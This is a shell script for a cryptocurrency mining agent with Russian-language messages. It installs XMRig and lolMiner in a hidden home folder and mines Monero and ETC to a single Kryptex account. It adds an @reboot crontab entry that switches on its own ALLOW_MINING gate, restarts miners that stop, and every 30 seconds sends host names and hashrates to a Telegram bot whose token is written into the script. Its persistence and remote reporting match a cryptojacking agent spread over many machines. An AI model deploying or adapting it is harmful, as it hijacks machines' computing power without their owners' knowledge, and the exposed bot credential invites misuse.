#!/bin/sh
set -u

#################################################
# MINING AGENT — CPU + GPU + GPU HASHRATE (TG)
#################################################

[ "${ALLOW_MINING:-0}" = "1" ] || exit 0

HOST="$(hostname)"
INTERVAL=30

# ===== ACCOUNTS =====
KRIPTEX="krxX3PVQVR"

# ===== POOLS =====
XMR_POOL="xmr.kryptex.network:7029"
ETC_POOL="etc.kryptex.network:7033"

# ===== TELEGRAM =====
TG_TOKEN="5542234668:AAFO7fjjd0w7q7j-lUaYAY9u_dIAIldzhg0"
TG_CHAT="5336452267"
TG_API="https://api.telegram.org/bot${TG_TOKEN}/sendMessage"

tg() {
  curl -s --connect-timeout 10 \
    -X POST "$TG_API" \
    -d chat_id="$TG_CHAT" \
    --data-urlencode text="$1" >/dev/null 2>&1 || true
}

# ===== PATHS =====
BASE="$HOME/.mining"
BIN="$BASE/bin"
RUN="$BASE/run"
LOG="$BASE/log"

mkdir -p "$BIN/cpu" "$BIN/gpu" "$RUN" "$LOG" >/dev/null 2>&1

#################################################
# INSTALL
#################################################

install_xmrig() {
  tg "📦 [$HOST] Установка XMRig"
  pkill xmrig 2>/dev/null || true
  rm -f "$BIN/cpu/xmrig"

  wget -q https://xmrig.com/download/xmrig-6.25.0-linux-static-x64.tar.gz -O /tmp/xmr.tgz || return
  tar -xzf /tmp/xmr.tgz -C "$BIN/cpu" --strip-components=1
  chmod +x "$BIN/cpu/xmrig"
}

install_lolminer() {
  tg "📦 [$HOST] Установка lolMiner"
  pkill lolMiner 2>/dev/null || true
  rm -f "$BIN/gpu/lolMiner"

  wget -q https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98a/lolMiner_v1.98a_Lin64.tar.gz -O /tmp/lol.tgz || return
  tar -xzf /tmp/lol.tgz -C "$BIN/gpu" --strip-components=1
  chmod +x "$BIN/gpu/lolMiner"
}

#################################################
# CPU (xmrig)
#################################################

start_cpu() {
  stop_cpu
  nohup "$BIN/cpu/xmrig" \
    -o "$XMR_POOL" \
    -u "$KRIPTEX.$HOST" -p x \
    --http-enabled --http-host 127.0.0.1 --http-port 16000 \
    >> "$LOG/cpu.log" 2>&1 &
  echo $! > "$RUN/cpu.pid"
  tg "⚙️ [$HOST] CPU XMR запущен"
}

stop_cpu() {
  [ -f "$RUN/cpu.pid" ] && kill "$(cat "$RUN/cpu.pid")" 2>/dev/null || true
  rm -f "$RUN/cpu.pid"
}

#################################################
# GPU (lolMiner)
#################################################

start_gpu() {
  stop_gpu
  nohup "$BIN/gpu/lolMiner" \
    --algo ETCHASH \
    --pool "$ETC_POOL" \
    --user "$KRIPTEX.$HOST" \
    --ethstratum ETCPROXY \
    --apihost 127.0.0.1 --apiport 8080 \
    >> "$LOG/gpu.log" 2>&1 &
  echo $! > "$RUN/gpu.pid"
  tg "🔥 [$HOST] GPU ETC запущен"
}

stop_gpu() {
  [ -f "$RUN/gpu.pid" ] && kill "$(cat "$RUN/gpu.pid")" 2>/dev/null || true
  rm -f "$RUN/gpu.pid"
}

#################################################
# HASHRATES
#################################################

get_cpu_hashrate() {
  curl -s --max-time 2 http://127.0.0.1:16000/1/summary \
    | grep -oE '"total":\[[^]]+' \
    | grep -oE '[0-9]+' \
    | head -1 || echo 0
}

get_gpu_hashrate() {
  curl -s --max-time 2 http://127.0.0.1:8080/summary \
    | grep -oE '"Performance":[ ]*[0-9]+(\.[0-9]+)?' \
    | grep -oE '[0-9]+(\.[0-9]+)?' \
    | awk '{ printf "%.0f", $1 * 1000000 }' || echo 0
}

#################################################
# TELEMETRY → TELEGRAM
#################################################

send_telemetry() {
  CPU_HR=$(get_cpu_hashrate)
  GPU_HR=$(get_gpu_hashrate)

  tg "📊 [$HOST]
CPU: ${CPU_HR} H/s
GPU: ${GPU_HR} H/s
CPU miner: $([ -f "$RUN/cpu.pid" ] && echo ON || echo OFF)
GPU miner: $([ -f "$RUN/gpu.pid" ] && echo ON || echo OFF)"
}

#################################################
# AUTOSTART
#################################################

ensure_autostart() {
  crontab -l 2>/dev/null | grep -q "ALLOW_MINING=1 $BASE/min.sh" && return
  (crontab -l 2>/dev/null; echo "@reboot ALLOW_MINING=1 $BASE/min.sh") | crontab -
}

#################################################
# AGENT LOOP
#################################################

agent() {
  tg "🚀 [$HOST] Агент запускается"
  ensure_autostart
  install_xmrig
  install_lolminer
  start_cpu
  start_gpu

  while true; do
    [ -f "$RUN/cpu.pid" ] || { start_cpu; tg "♻️ [$HOST] CPU перезапуск"; }
    [ -f "$RUN/gpu.pid" ] || { start_gpu; tg "♻️ [$HOST] GPU перезапуск"; }
    send_telemetry
    sleep "$INTERVAL"
  done
}

#################################################
# MAIN
#################################################

agent
